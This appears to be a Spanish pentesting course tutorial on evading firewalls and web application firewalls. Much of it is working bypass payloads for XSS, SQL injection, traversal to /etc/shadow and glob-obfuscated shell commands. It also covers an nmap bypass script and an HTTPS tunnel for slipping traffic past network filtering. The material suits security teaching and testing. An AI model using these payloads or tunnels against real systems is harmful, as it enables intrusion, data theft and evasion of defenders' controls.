---
title: "Técnicas de Evasión de Firewalls"
subtitle: "**Técnicas de Evasión de Firewalls: Cómo Evadir WAF, Emplear Herramientas como NMAP y Verificar Métodos de Evasión para una Seguridad de Red Óptima**"
tags: ["pentesting", "ciberseguridad", "Firewalls"]
authors: ["blindma1den", "lorenagubaira"]

---

## Técnicas empleadas por los cortafuegos

Los firewalls emplean al menos una de las siguientes técnicas para realizar un seguimiento del tráfico de la red:

1. **Filtrado de paquetes** : la mayoría de los firewalls son de este tipo. Pequeños fragmentos de datos llamados paquetes son examinados por una serie de filtros cuando intentan ingresar a la red. Luego, según el origen y el destino de las direcciones IP, protocolos y puertos, el firewall decide si se les permite ingresar o no.
2. **Firewall de aplicación/puerta de enlace**: al filtrar el tráfico a nivel de aplicación. Para evitar conexiones directas entre el dispositivo y los paquetes entrantes, los servidores proxy actúan como intermediarios.
3. **Firewall de próxima generación** (NGFW): para defenderse contra ataques de red y basados ​​en la web, estos sofisticados firewalls integran tecnologías clásicas de firewall de red con firewalls de aplicaciones web (WAF). Un NGFW también incluye funciones adicionales que incluyen antivirus, inspección de tráfico cifrado y sistemas de prevención de intrusiones (IPS). La inspección profunda de paquetes, que examina los datos en la carga útil del paquete en lugar de simplemente el encabezado del paquete, es una característica de un NGFW.
4. **Inspección de estado**: esta es una técnica más reciente que examina el paquete en busca de rasgos distintivos particulares mientras compara componentes importantes del paquete con una base de datos. Se permite que el paquete pase si hay una coincidencia razonable.

> **"No permita que su firewall se convierta en un eslabón débil en su estrategia de ciberseguridad"**

# Métodos de evasión

A pesar de que **los firewalls y los IDS** pueden impedir que paquetes maliciosos entren en una red, un atacante puede enviar paquetes modificados al objetivo para que pueda superar el IDS/Firewall. Estos son diez métodos de evasión:

1. **Cifrar datos**: al cifrar los datos que se transmiten, resulta más difícil para el firewall o el sistema de detección de intrusos detectar cualquier actividad maliciosa.
2. **VPN**: una red privada virtual (VPN) puede ayudar a eludir los firewalls y los sistemas de detección de intrusiones al enrutar el tráfico a través de un servidor seguro.
3. **Servidor proxy**: un servidor proxy puede ayudar a enmascarar el origen del tráfico, lo que dificulta que el firewall o el sistema de detección de intrusos rastreen el origen de un ataque.
4. **TOR**: La red TOR puede ayudar a ocultar la identidad del usuario y el origen del tráfico, lo que dificulta que el firewall o el sistema de detección de intrusiones detecten cualquier actividad maliciosa.
5. **Salto de puerto**: al cambiar constantemente el puerto utilizado para transmitir datos, resulta más difícil para el firewall o el sistema de detección de intrusos detectar cualquier actividad maliciosa.
6. **Esteganografía**: al ocultar datos dentro de otro archivo o mensaje, resulta más difícil para el firewall o el sistema de detección de intrusos detectar cualquier actividad maliciosa.
7. **Protocolos de capa de aplicación**: al utilizar protocolos de capa de aplicación como HTTP o SMTP, resulta más difícil para el firewall o el sistema de detección de intrusos detectar cualquier actividad maliciosa.
8. **Código malicioso:** al utilizar código malicioso o malware, resulta más difícil para el firewall o el sistema de detección de intrusiones detectar cualquier actividad maliciosa.
9. **Ingeniería social**: al engañar a los usuarios para que divulguen información confidencial o realicen determinadas acciones, resulta más fácil para un atacante eludir el firewall o el sistema de detección de intrusos.
10. **Acceso físico**: al acceder físicamente a la red o al sistema, un atacante puede eludir el firewall o el sistema de detección de intrusos.
11. **Software obsoleto**: los cortafuegos dependen del software para funcionar correctamente y este software debe actualizarse periódicamente para mantenerse al día con las últimas amenazas. Si no actualiza su software de firewall, puede volverse vulnerable a ataques descubiertos desde la última actualización.
12. **Contraseñas débiles:** una contraseña segura y única es una de las formas más importantes de proteger su firewall contra violaciones. Si utiliza una contraseña débil o fácil de adivinar, los hackers pueden acceder fácilmente a su firewall y comprometer su sistema.
13. **Acceso remoto no seguro:** si permite el acceso remoto a su sistema, es esencial proteger este acceso con una contraseña segura y autenticación de dos factores. Si no se toman estas medidas, los hackers pueden potencialmente obtener acceso a su firewall a través de acceso remoto.
14. **Reglas configuradas incorrectamente :** los firewalls se basan en reglas para determinar qué tráfico está permitido y qué está bloqueado. Si estas reglas no se configuran correctamente, es posible que se permita que tráfico no deseado atraviese el firewall y comprometa su sistema.

> Para proteger su firewall contra violaciones, es esencial actualizar periódicamente su software, usar contraseñas seguras, protegerse contra infecciones de malware, proteger el acceso remoto y configurar correctamente las reglas de su firewall.

## Cómo evadir un WAF

### ¿Qué hacer para encontrar el proveedor de WAF y la dirección IP real?

Divulgación de propiedad intelectual real

1. EJECUTE `shodan.io` o `censys.io`
2. Busque registros SPF y registros TXT.

Los registros SPF y TXT pueden tener una dirección IP de un punto de origen sin CloudFlare.

> 3. También puede consultar securitytrails.com en el campo Los datos históricos pueden tener IP original en registros antiguos.

**Cómo probar que WAF esté configurado correctamente:**

- Los WAF utilizan los puertos estándar 80, 443, 8000, 8008, 8080 y 8088.
- Los WAF configuran sus propias cookies en las solicitudes.
- Los WAF se asocian con encabezados separados.
- Los WAF se exponen en el encabezado del servidor.
- Los WAF se exponen en el contenido de la respuesta.
- Los WAF responden con códigos de respuesta únicos ante solicitudes maliciosas.
- Envíe una solicitud GET estándar desde un navegador, intercepte y registre encabezados de respuesta (cookies específicas).
- Envíe una solicitud desde la línea de comando (por ejemplo, cURL) y luego verifique el contenido y los encabezados de la respuesta.
- Envíe solicitudes GET a puertos abiertos aleatorios y verifique pancartas que puedan exponer la identidad de los WAF.
- Pruebe algunas cargas útiles de inyección SQL como: ”o 1 = 1: para iniciar sesión en formularios u olvidar una contraseña.
- Pruebe con cargas útiles XSS ruidosas como <script>confirm()</script> en algunos campos de entrada.
- Intente agregar ../../../etc/passwd a un parámetro aleatorio en la dirección URL.
- Agregue algunas cargas útiles como ' OR SLEEP(5) OR ' al final de las URL a cualquier parámetro aleatorio.
- Envíe solicitudes GET con protocolos obsoletos como HTTP/0.9 (HTTP/0.9 no admite consultas de tipo POST).
- Consulte el encabezado del servidor sobre diferentes tipos de interacciones.
- Envíe un paquete FIN&RST sin procesar al servidor e identifique una respuesta.
- Ataques de canal lateral: examine el comportamiento temporal del contenido de la solicitud y la respuesta.

## Herramientas para verificar y omitir WAF

> w3af : marco de auditoría y ataque de aplicaciones web

- **[wafw00f](https://github.com/EnableSecurity/wafw00f)** — Identificar y tomar huellas dactilares del firewall de aplicaciones web

- **[BypassWAF](https://github.com/vincentcox/bypass-firewalls-by-DNS-history):** evita los firewalls abusando del historial de DNS. Esta herramienta buscará registros DNS A antiguos y comprobará si el servidor responde para ese dominio.

- **[CloudFail](https://github.com/m0rtem/CloudFail)** : es una herramienta de reconocimiento táctico que intenta encontrar la dirección IP original detrás del WAF de Cloudflare.

## Técnicas para evitar WAF:

### 1. Técnica de alternancia de casos

Combine caracteres en mayúsculas y minúsculas para crear cargas útiles eficientes.

**Solicitud básica:**

```bash
<script>confirm()</script>
```

**Técnica omitida:**

```bash
<ScrIpT>confirm()</sCRiPt>
```

**Solicitud básica:**

> SELECT * FROM * WHERE OWNER = 'NAME_OF_DB'

**Técnica omitida:**

> sELeCt * fRoM * wHerE OWNER = 'NAME_OF_DB'

**Ejemplo en URL:**

> http://example.com/index.php?page_id=-1 UnIoN SeLeCT 1,2,3,4

### 2. Técnica de codificación de URL

Codifique cargas útiles normales con % de codificación/codificación de URL. Puedes usar Burp Suite. Dispone de una herramienta codificadora/decodificadora.

**Bloqueado por WAF:**

```bash
<Svg/x=“>”/OnLoAD=confirm()//
```

**Técnica omitida:**

```bash
%3CSvg%2Fx%3D%22%3E%22%2FOnLoAD%3Dconfirm%28%29%2F%2F
```

**Bloqueado por WAF:**

```bash
UniOn(SeLeCt 1,2,3,4,5,6,7,8,9,10)
```

**Técnica omitida:**

```bash
UniOn%28SeLeCt+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%29
```

**Ejemplo en URL:**

> https://example.com/page.php?id=1%252f%252a*/UNION%252f%252a /SELECT

### 3. Técnica Unicode

Los caracteres ASCII en codificación Unicode nos brindan excelentes variantes para evitar WAF. Codifique toda o parte de la carga útil para obtener resultados.

**Solicitud básica:**

```bash
<marquee onstart=prompt()>
```

**Ofuscado:**

```bash
<marquee onstart=\u0070r\u06f\u006dpt()>
```

**Bloqueado por WAF:**

```bash
/?redir=http://google.com
```

**Técnica omitida:**

```bash
/?redir=http://google。com (Unicode alternative)
```

**Bloqueado por WAF:**

```bash
<marquee loop=1 onfinish=alert()>x
```

**Técnica omitida:**

```bash
＜marquee loop＝1 onfinish＝alert︵1)>x (Unicode alternative).
```

**Solicitud básica:**

> ../../etc/shadow

**Ofuscado:**

```bash
%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFshadow
```

### 4. Técnica de representación HTML

Las aplicaciones web codifican caracteres especiales en HTML. Codificarlos y renderizarlos en consecuencia. Casos de bypass básicos con codificación HTML numérica y genérica.

**Solicitud básica:**

```bash
<img src=x onerror=confirm()>
```

**Carga útil codificada:**

```bash
&quot;&gt;&lt;img src=x onerror=confirm&lpar;&rpar;&gt;
```

**Carga útil codificada:**

> &#34;&#62;&#60;img src=x onerror=confirm&#40;&#41;&#62;

### 5. Técnica de codificación mixta

Estas reglas suelen tender a filtrar un tipo específico de codificación. Estos filtros pueden evitarse mediante cargas útiles de codificación mixta. Nuevas líneas y tabulaciones y se agregan más a la ofuscación.

**Ofuscar carga útil:**

```bash
<A HREF="h

tt p://6 6.000146.0x7.147/">XSS</A>
```

### 6. Uso de la técnica de comentarios

Los comentarios ofuscan los vectores de carga útil estándar. Diferentes cargas útiles tienen diferentes formas de ofuscarse.

**Bloqueado por WAF:**

```bash
<script>confirm()</script>
```

**Técnica omitida:**

```bash
<!--><script>confirm/**/()/**/</script>
```

**Bloqueado por WAF:**

```bash
/?id=1+union+select+1,2--
```

**Técnica omitida:**

```bash
/?id=1+un/**/ion+sel/**/ect+1,2--
```

Inserte comentarios en medio de las cadenas de ataque. Por ejemplo, /*!SELECT*/ puede ser pasado por alto por el WAF pero pasado a la aplicación de destino y procesado por una base de datos mysql.

**Ejemplo en URL:**

> index.php?page_id=-1 %55nION/**/%53ElecT 1,2,3,4
> 
> 
> 'union%a0select pass from users#

**Ejemplo en URL:**

> index.php?page_id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3

### 7. Técnica de doble codificación

Los filtros de Web Application Firewall tienden a codificar caracteres para proteger la aplicación web. Los filtros mal desarrollados (sin filtros de recursividad) se pueden omitir con doble codificación.

**Solicitud básica:**

> http://example/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\

**Ofuscar carga útil:**

> http://example/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\

**Solicitud básica:**

```bash
<script>confirm()</script>
```

**Ofuscar carga útil:**

```bash
%253Cscript%253Econfirm()%253C%252Fscript%253E
```

### 8. Técnica de ofuscación con comodines

Varias utilidades de línea de comandos utilizan patrones globales para trabajar con varios archivos. Podemos cambiarlos para ejecutar comandos del sistema.

**Solicitud básica:**

> /bin/cat /etc/passwd

**Ofuscar carga útil:**

> /???/??t /???/??ss??

**Caracteres usados:**

> / ? t s

**Solicitud básica:**

> /bin/nc 127.0.0.1 443

**Ofuscar carga útil:**

> /???/n? 2130706433 443

**Caracteres usados:**

> / ? n [0-9]

### 9. Técnica de generación de carga útil dinámica

Los lenguajes de programación tienen diferentes patrones y sintaxis para la concatenación. Esto nos permite generar cargas útiles que pueden eludir muchos filtros y reglas.

**Solicitud básica:**

```bash
<script>confirm()</script>
```

**Ofuscar carga útil:**

```bash
<script>eval('con'+'fi'+'rm()')</script>
```

**Solicitud básica:**

> /bin/cat /etc/shadow

**Ofuscar carga útil:**

> /bi'n'''/c''at' /e'tc'/sh''ad'ow

Bash permite la concatenación de rutas para su ejecución.

**Solicitud básica:**

```bash
<iframe/onload='this["src"]="javascript:confirm()"';>
```

**Ofuscar carga útil**

```bash
<iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:con"+"fir"+"m()"';>
```

### 10. Técnica de personajes basura

WAF filtra fácilmente las cargas útiles simples. Agregar algunos caracteres basura ayuda a evitar la detección (solo en casos específicos). Esta técnica a menudo ayuda a confundir los firewalls basados ​​en expresiones regulares.

**Solicitud básica:**

```bash
<script>confirm()</script>
```

**Ofuscar carga útil:**

```bash
<script>+-+-1-+-+confirm()</script>
```

**Solicitud básica:**

```bash
<BODY onload=confirm()>
```

**Ofuscar carga útil:**

```bash
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()>
```

**Solicitud básica:**

```bash
<a href=javascript;alert()>ClickMe
```

**Técnica omitida:**

```bash
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
```

### 11. Técnica de saltos de línea

Muchos WAF con filtrado basado en expresiones regulares bloquean eficazmente muchos intentos. La técnica de saltos de línea (CR y LF) puede romper la expresión regular del firewall y omitir cosas.

**Solicitud básica:**

```bash
<iframe src=javascript:confirm(hacker)">
```

**Ofuscar carga útil:**

```bash
<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(hacker)">
```

### 12. Técnica de variables no inicializadas

Los filtros basados ​​en expresiones regulares incorrectos se pueden evadir con variables bash no inicializadas. Dicho valor es igual a nulo y actúa como cadenas vacías. Bash y Perl permiten este tipo de interpretaciones.

Ofuscación de primer nivel: normal

**Solicitud básica:**

> /bin/cat /etc/shadow

**Ofuscar carga útil:**

> /bin/cat$u /etc/shadow$u

Ofuscación de segundo nivel: basada en la posición

**Solicitud básica:**

> /bin/cat /etc/shadow

**Ofuscar carga útil:**

> $u/bin$u/cat$u $u/etc$u/shadow$u

Ofuscación de tercer nivel: caracteres aleatorios

**Solicitud básica:**

> /bin/cat /etc/passwd

**Ofuscar carga útil:**

> $aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff

### 13. Técnica de tabulaciones y avances de línea

Las pestañas a menudo ayudan a evadir los firewalls, especialmente los basados ​​en expresiones regulares. Las pestañas pueden ayudar a romper la expresión regular WAF cuando la expresión regular espera espacios en blanco y no pestañas.

**Solicitud básica:**

```bash
<IMG SRC="javascript:confirm();">
```

**Técnica omitida:**

```bash
<IMG SRC=" javascript:confirm();">
```

**Variante:**

```bash
<IMG SRC=" jav ascri pt:confirm ();">
```

**Solicitud básica:**

> http://test.com/test?id=1 union select 1,2,3

**Técnica omitida** :

> http://test.com/test?id=1%09union%23%0A%0Dselect%2D%2D%0A%0D1,2,3

**Solicitud básica:**

```bash
<iframe src=javascript:confirm()></iframe>
```

**Ofuscar carga útil:**

```bash
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:c&Tab;o&Tab;n&Tab;f&Tab;i&Tab;r&Tab;m&Tab;%28&Tab;%29></iframe>
```

### 14. Técnica para romper fichas

Los ataques a tokens intentan romper la lógica de dividir una solicitud en tokens con disyuntores de tokens. Los token-breakers son símbolos que permiten afectar la correspondencia entre un elemento de una cadena y un determinado token. Nuestra solicitud debe seguir siendo válida mientras utilizamos rompedores de tokens.

Estudio de caso: token desconocido para el "tokenizador"

**Nuestra carga útil:**

```bash
?id=‘-sqlite_version() UNION SELECT passwords FROM users --
```

Estudio de caso: contexto desconocido para el analizador (observe el corchete sin contexto)

**Primera carga útil:**

```bash
?id=12);DROP TABLE users --
```

**Segunda carga útil:**

```bash
?id=133) INTO OUTFILE ‘xxx’ --
```

### 15. Técnica de ofuscación en otros formatos.

Muchas aplicaciones web admiten diferentes tipos de codificación y pueden interpretar la codificación. Siempre necesitamos ofuscar la carga útil a un formato que no sea compatible con WAF, pero el servidor puede pasar de contrabando nuestra carga útil.

Caso IIS:

IIS 6, 7.5, 8 y 10 permiten interpretaciones de caracteres IBM037. Envíe los parámetros codificados con la consulta.

**Solicitud original:**

```bash
POST /example.aspx?id7=sometext HTTP/1.1

HOST: target.org

Content-Type: application/x-www-form-urlencoded; charset=utf-8

Content-Length: 27

id2='union all select * from users--
```

**Solicitud ofuscada con codificación de URL:**

```bash
POST /example.aspx?%89%84%F7=%A2%95%94%86%A3%88%89%95%87 HTTP/1.1

HOST: target.org

Content-Type: application/x-www-form-urlencoded; charset=ibm037

Content-Length: 127

%89%84%F2=%7D%A4%95%89%97%95%40%81%93%94%40%A2%85%93%85%84%A3%40%5C%40%86%99%97%94%40%A4%A2%85%99%A2%60%60
```

## NMAP - Script firewall-bypass

Detecta una vulnerabilidad en netfilter y otros firewalls que utilizan ayudas para abrir dinámicamente puertos para protocolos como ftp y sip. El script funciona falsificando un paquete del servidor de destino solicitando abrir una conexión relacionada a un puerto de destino que será cumplida por el firewall a través del puerto auxiliar de protocolo adecuado. Para que esto funcione, la máquina atacante debe estar en el mismo segmento de red que el firewall. El script admite el asistente ftp tanto en IPv4 como en IPv6. El filtro de ruta real se utiliza para prevenir este tipo de ataques.

Descarga: **[https://svn.nmap.org/nmap/scripts/firewall-bypass.nse](https://svn.nmap.org/nmap/scripts/firewall-bypass.nse)**

Para más información, ver:

- **[http://home.regit.org/2012/03/playing-with-network-layers-to-bypass-firewalls-filtering-policy/](http://home.regit.org/2012/03/playing-with-network-layers-to-bypass-firewalls-filtering-policy/)**

**Argumentos**

- firewall-bypass.helper

- El ayudante a utilizar. El valor predeterminado es ftp. Ayudantes compatibles: ftp (tanto IPv4 como IPv6).

**firewall-bypass.targetport**

Puerto para probar la vulnerabilidad. El puerto de destino debe ser un puerto no abierto. Si no se proporciona, el script intentará encontrar un puerto filtrado o cerrado a partir de los resultados del escaneo de puertos.

**firewall-bypass.helperport**

> Si no utiliza el puerto predeterminado del asistente.


**Ejemplos**

```bash
nmap --script firewall-bypass <target>

nmap --script firewall-bypass --script-args firewall-bypass.helper=“ftp”, firewall-bypass.targetport=22 <target> 
```

**Salida**

```bash
Host script results:

| Firewall omission:

|_ Firewall vulnerable to omission via ftp wizard (IPv4)
```

**Cómo evitar los firewalls ocultando todo el tráfico en el tráfico encapsulado HTTPS(SSL)443**

Por lo general, cuando se está detrás de un firewall público o bloqueado, la mayoría del tráfico de salida (saliente) permitido es el puerto 80(http) y 443(https). Esto es para permitir sólo la navegación web y evitar el uso de otras aplicaciones y servicios como el correo electrónico o los juegos. El tráfico web saliente también se puede restringir mediante el filtrado de contenido, permitiendo a qué tipo de sitios web se puede acceder. Otra gran preocupación es la privacidad. Cuando utiliza redes públicas o incluso utiliza la red de su propio ISP, todo su tráfico es visible para ellos.

Con esta configuración de proxy inverso podemos enmascarar todo nuestro tráfico para que aparezca esencialmente como tráfico HTTPS, lo que nos permite evitar muchas de estas restricciones. Esto también se puede utilizar como alternativa a las VPN o junto con VPN para enmascarar aún más el tráfico y proporcionar más privacidad. Este método funcionará en la mayoría de las situaciones. A veces, se configura la inspección SSL o se aprovecha el filtrado de contenido avanzado y/o la inteligencia sobre amenazas, lo que aumenta los factores de bloqueo del tráfico. Sin embargo, estos escenarios normalmente sólo ocurren en entornos corporativos maduros y no en las redes públicas promedio.

Alojaremos un proxy inverso en Internet. Con una herramienta llamada stunnel podemos crear un túnel de reenvío de puertos cifrados a través de una conexión 443 (HTTPS). Luego usaremos ese reenvío de puerto para crear un túnel ssh oculto dentro del tráfico 443(ssl) cifrado que nos permitirá configurar un proxy de sockets anidado O un reenvío de puerto que a su vez nos permitirá enviar cualquier tráfico que queramos fuera de la red.

![firewall-bypass](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/firewall-bypass.es.png?raw=true)

### Requisitos

Para esta implementación usaré un VPS (servidor privado virtual) Ubuntu 23.04 para el servidor proxy inverso y Kali 6.3.0 para la máquina cliente . Esta configuración no requiere estos sistemas operativos específicamente. Si decide utilizar diferentes sistemas operativos, asegúrese de que las herramientas sean compatibles.

Servidor proxy inverso:

- [LetsEncrypt (servicio de certificado SSL gratuito)](https://letsencrypt.org/docs/faq/)
- Dominio comprado para crear un certificado SSL válido (puede ser un dominio económico, es decir, $1,99/año)

Herramientas/Servicios

- [apache2](https://httpd.apache.org/)
- [certbot](https://certbot.eff.org/)
- [stunnel(server mode)](https://www.stunnel.org/)

Máquina cliente:

Herramientas

- [stunnel (modo cliente)](https://www.stunnel.org/)

### Configuración

Servidor Proxy inverso

El servidor requerirá el mayor esfuerzo de configuración. Como se trata de una nueva instalación de Ubuntu, actualizaremos y actualizaremos el servidor.

```bash
sudo apt update && sudo apt upgrade -y
```

Ahora necesitamos instalar el servicio apache2 y luego ejecutar certbot para recibir nuestro certificado SSL de LetsEncrypt. Esto nos permite recibir un certificado SSL firmado relacionado con nuestro dominio para el servidor proxy inverso.

**Instalar Apache2**

```bash
sudo apt update

sudo apt install apache2
```

Teniendo en cuenta que el servidor ejecuta servicios y es accesible desde Internet, crearemos reglas de firewall basadas en host.

Crear reglas de firewall basadas en host

```bash

sudo ufw allow 22/tcp

sudo ufw allow 80/tcp

sudo ufw allow 443/tcp 
```

No dude en agregar más reglas de firewall que sean necesarias para cualquier otro servicio que decida ejecutar. Ahora que se crearon las reglas, debemos habilitarlas.

Habilitar reglas de firewall

```bash
sudo ufw reload
```

Habilitar el servicio Apache2

```bash
sudo systemctl start apache2
```

Ahora, como se explica en el sitio web de certbot, utilizaremos el servicio apache2 para solicitar nuestro certificado SSL firmado para el dominio comprado. Si aún no posee uno, este es el momento de comprar un dominio antes de continuar. El dominio que adquirimos es importante porque aquí es hacia1 donde se verá todo nuestro tráfico tunelizado cuando pase a través de la red y el firewall. Elija un nombre de dominio genérico o inocente con un dominio de nivel superior común como .com, .net, .io, etc. (Se sabe que los firewalls con inteligencia de amenazas bloquean dominios baratos o poco comunes como .xyz)

El registrador suele proporcionar servicios DNS que utilizará para el dominio que compró. Una vez que haya creado un registro DNS A y apunte a su servidor proxy inverso, estará listo para recibir su certificado SSL utilizando certbot. Certbot es un script que automatiza la creación de certificados SSL con LetsEncrypt. Para ver instrucciones específicas, que pueden variar según el sistema operativo de su servidor proxy inverso, [visite aquí](https://certbot.eff.org/instructions)

**Instalar Certbot**

```bash
sudo snap install --classic certbot

sudo ln -s /snap/bin/certbot /usr/bin/certbot
```

Antes de ejecutar cerbot, editaremos el archivo de configuración /etc/apache2/sites-available/000-default.conf para que el script cerbot pueda identificar nuestro servidor por el nombre de dominio adquirido.

Editar el archivo de configuración de Apache2

```bash
sudo vim /etc/apache2/sites-available/000-default.conf
```

Agregue la siguiente línea al archivo de configuración.

```bash
ServerName yourdomain.net
```

![yourdomain.net](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/yourdomain.net.png?raw=true)

Ahora es el momento de recibir nuestro certificado SSL y comenzar la configuración de Stunnel.

Ejecutar certbot

```bash
sudo snap install --classic certbot
```

Una vez que esto se ejecute correctamente, debería ver el resultado de dónde se encuentran su nuevo certificado SSL y clave privada.

```bash
cert = /etc/letsencrypt/live/yourdomain.net/fullchain.pem

key = /etc/letsencrypt/live/yourourdomain.net/privkey.pem
```

Ya no necesitamos el servicio apache2 ahora que hemos usado certbot para obtener nuestro certificado SSL válido. El servicio debe detenerse para que stunnel pueda utilizar más tarde el puerto de escucha 443.

Detener el servicio Apache2

```bash
sudo systemctl stop apache2
```

Ahora se puede configurar Stunnel. Instálelo en el servidor proxy inverso.

Instalar Stunnel

```bash
sudo apt update
 
sudo apt install stunnel4
```

Cree/edite el archivo de configuración de stunnel en el servidor para usar nuestro nuevo certificado SSL. Definiremos su puerto de escucha e instrucciones de reenvío.

```bash
sudo vim /etc/stunnel/stunnel.conf
```

Agregue las siguientes líneas al archivo de configuración

```bash
pid = /var/run/stunnel.pid

cert = /etc/letsencrypt/live/yourdomain.net/fullchain.pem

key = /etc/letsencrypt/live/yourourdomain.net/privkey.pem

[ssh]

accept = 0.0.0.0.0:443

connect = localhost:22
```

![yourdomain.net1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/yourdomain.net1.png?raw=true)

Edite el archivo de configuración adicional de stunnel para habilitar el servicio

```bash
sudo vim /etc/default/stunnel4
```

Agregue la siguiente línea al final del archivo de configuración

> ENABLED=1

![yourdomain.net2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/yourdomain.net2.png?raw=true)

Iniciar el servicio de túnel

```bash
sudo /etc/init.d/stunnel4 restart 
```

Para asegurarse de que el servicio stunnel se esté ejecutando y escuchando en el puerto 443 especificado, ejecute el siguiente comando

```bash
sudo netstat -ano | grep tcp
```

![yourdomain.net3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/yourdomain.net3.png?raw=true)

Si ve que su servidor proxy inverso está escuchando en el puerto 443 después de iniciar el servicio stunnel, ¡ya está todo listo! Ahora pasemos a la máquina cliente, configuremos el cliente stunnel y comencemos a omitirlo.

### Máquina cliente

Actualice y actualice la nueva instalación de Kali en la máquina cliente.

```bash
sudo apt update && sudo apt upgrade -y
```

Ahora que nuestra máquina cliente está actualizada y lista para funcionar, necesitamos instalar stunnel.

**Instalar Stunnel**

```bash
sudo apt install stunnel4
```

Cree un archivo de configuración para el cliente stunnel. Esto se puede crear en cualquier lugar, pero yo crearé el mío en el directorio $HOME.

Crear archivo de configuración

```bash
vim $HOME/stunnel-client.conf
```

Agregue las siguientes líneas al archivo de configuración

```bash
pid = /tmp/stunnel.pid

client=yes

[ssh]

accept=9443

connect=yourdomain.net:443
```

![Maquina Cliente1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquina-cliente1.png?raw=true)

Ejecute el cliente stunnel para conectarse al servidor proxy inverso estableciendo el túnel ssl(443)

```bash
sudo stunnel $HOME/stunnel-client.conf
```

Ahora confirme si el cliente está escuchando en su puerto de reenvío definido en el archivo de configuración.

```bash
sudo netstat -an | grep tcp
```

![Maquina Cliente2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquina-cliente2.png?raw=true)

**Evitando**

El servidor proxy inverso está completamente instalado y configurado. Podemos conectarnos exitosamente desde nuestra máquina cliente usando stunnel para crear el túnel ssl(443). Ahora configuraremos nuestro puerto SSH forward o proxy de sockets  que estará oculto dentro de nuestro túnel ssl(443).

sockets SSH 4/5 Proxy

Este túnel SSH abrirá un proxy de sockets  en la máquina cliente que reenviará cualquier tráfico que se le envíe a través del túnel ssh que está oculto dentro del túnel ssl(443).

Crear el túnel proxy ssh sock

```bash
sudo ssh -D 9090 -q -C -N <user>@127.0.0.1 -p 9443
```

- D : especifica el puerto de escucha del proxy socks en el cliente
- q : ejecuta el modo silencioso donde no se muestra ninguna salida localmente
- C : comprime los datos en el túnel para ahorrar ancho de banda
- N : la sesión ssh no interactiva sólo crea el túnel no hay símbolo del sistema
- p : define el puerto de destino al que conectarse (nos estamos conectando al puerto de reenvío proporcionado por el cliente stunnel)

![Maquina Cliente3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquina-cliente3.png?raw=true)

Reenvío de puerto SSH

Este túnel SSH creará un puerto de escucha en la máquina cliente para reenviar el tráfico a través del túnel ssh que está oculto dentro del túnel ssl(443).

Crear el túnel de reenvío de puertos ssh

```bash
sudo ssh -q -C -N -L 9090:<destination ip>:<destination port> <user>@127.0.0.1 -p 9443
```

- L : especifica el puerto de escucha del reenvío de puerto en el cliente
- q : ejecuta el modo silencioso en el que no se muestra ninguna salida localmente
- C : comprime los datos en el túnel para ahorrar ancho de banda
- N : la sesión ssh no interactiva sólo crea el túnel no hay símbolo del sistema
- p : define el puerto de destino al que conectarse (nos estamos conectando al puerto de reenvío proporcionado por el cliente stunnel)

![Maquina Cliente4](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquina-cliente4.png?raw=true)

## **Conclusión**

Con esta configuración y técnica del servidor proxy inverso podemos hacer que todo el tráfico O específico aparezca como HTTPS(443). Una vez que el cliente establece su túnel SSL con el servidor proxy inverso, el firewall no puede distinguir entre nuestro túnel SSL y el tráfico HTTPS(443) normal debido al cifrado. En las redes públicas en general, esto es suficiente para evitar las restricciones del firewall. Esto también funciona como alternativa de VPN en redes donde el tráfico VPN está bloqueado. Recuerde que sólo el tráfico TCP puede atravesar el proxy ssh Socks o el reenvío de puertos.

Cuando se trata de firewalls avanzados, existen muchos factores adicionales que pueden determinar si la conexión SSL está permitida a través del puerto 443. Los firewalls más avanzados no solo pueden realizar inspección SSL (descifrado), sino que también pueden tomar decisiones para permitir el tráfico según la dirección IP geográfica de destino. ubicación, atributos del certificado SSL, categorización del dominio y reputación del dominio. Aquí es donde es crucial elegir un dominio con un TLD (dominio de nivel superior) común y un país generalmente confiable para alojar el servidor proxy inverso.

> 👉 Se recomendaría registrar un dominio caducado que ya tenga categorización de URL y buena reputación. Si ha comprado un dominio nuevo, hay formas de clasificarlo y crear una reputación de dominio. Estos no se tratarán aquí, pero se abordarán en otro blog. Si llegó hasta aquí, espero que haya sido útil y estoy seguro de que se le ocurrirán algunos casos de uso creativos para esta configuración.

Es fundamental comprender primero cómo funciona un firewall antes de intentar hackearlo. Un firewall realiza un seguimiento de todo el tráfico de la red, tanto entrante como saliente, y, según las reglas que se hayan configurado, permite o prohíbe que ese tráfico llegue a su destino. El hecho de que los firewalls sean frecuentemente la línea inicial de defensa en una red los convierte en un ejemp lo de seguridad perimetral.

Resumamos todo lo escrito anteriormente. Piense siempre fuera de lo común. Pruebe diferentes técnicas de codificación y algunas funcionarán. No seas perezoso en comprobar los registros DNS. No olvide que se puede eludir cualquier protección en los recursos web y que WAF no es una panacea para todos los problemas. Los hackers no duermen y siempre buscan nuevas técnicas para atacar tus recursos y obtener beneficios. Las pruebas de penetración periódicas le ayudarán a evitar muchos problemas.
